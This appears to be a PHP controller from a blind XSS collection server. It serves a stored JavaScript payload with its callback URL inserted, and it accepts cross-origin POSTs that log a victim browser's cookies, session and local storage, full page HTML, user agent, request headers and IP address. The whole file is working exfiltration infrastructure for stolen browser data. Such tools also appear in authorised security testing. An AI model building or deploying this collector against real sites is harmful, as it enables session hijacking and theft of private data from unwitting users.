<?php

require dirname(__DIR__).'/classes/autoload.php';

use Blind\Main as Main;
use Blind\Link as Link;

class J extends Controller
{

    public function main() {
        Main::redirect('/');
    }

    public function s($path = '') {

        if (!empty($path)) {

            $link = $this->model->getLinkByPath(trim($path));

            if ($link) {

                if ($_SERVER['REQUEST_METHOD'] == 'GET') {
                    $payload = $this->model->getPayload($link->payload);

                    $payload = preg_replace("/\[URL]/", '//'.DOMAIN.'/j/s/'.trim($path), $payload->payload);

                    header('Content-Type: application/javascript');

                    require APP . 'view/standard/payload.php';
                }
                elseif ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_SERVER['HTTP_ORIGIN'])) {

                    header('Access-Control-Allow-Origin: '.$_SERVER['HTTP_ORIGIN']);

                    if (!empty($_SERVER['CONTENT_TYPE']) && $_SERVER['CONTENT_TYPE'] === 'application/json') {

                        // data from POST request
                        $post_data = json_decode(file_get_contents('php://input'), true);

                        if (!empty($post_data['URL']) && !empty($post_data['HTML'])) {

                            // client data
                            $client_data = array();

                            $client_data['URL'] = $post_data['URL'];
                            $client_data['SESSION_STORAGE'] = json_encode($post_data['SESSION_STORAGE']);
                            $client_data['LOCAL_STORAGE'] = json_encode($post_data['LOCAL_STORAGE']);
                            $client_data['HTML'] = $post_data['HTML'];
                            $client_data['COOKIE'] = (!empty($post_data['COOKIE'])) ? $post_data['COOKIE'] : '';
                            $client_data['USER_AGENT'] = (!empty($post_data['USER_AGENT'])) ? $post_data['USER_AGENT'] : '';

                            // request data
                            $headers = json_encode(getallheaders());
                            // request IP
                            $request_ip = $_SERVER['REMOTE_ADDR'];

                            $request_id = $this->model->saveRequest($link->id);

                            if ($request_id) {
                                $this->model->saveClientData($request_id, $client_data);
                                $this->model->saveRequestData($request_id, $headers, $request_ip);
                            }
                        }
                    }
                }
                elseif ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {

                    header('Access-Control-Allow-Origin: '.$_SERVER['HTTP_ORIGIN']);
                    header('Access-Control-Allow-Methods: POST, GET, OPTIONS ');
                    header('Access-Control-Allow-Headers: Content-Type');
                }
            }
            else
                Main::redirect('/');
        }
        else
            Main::redirect('/');
    }
}

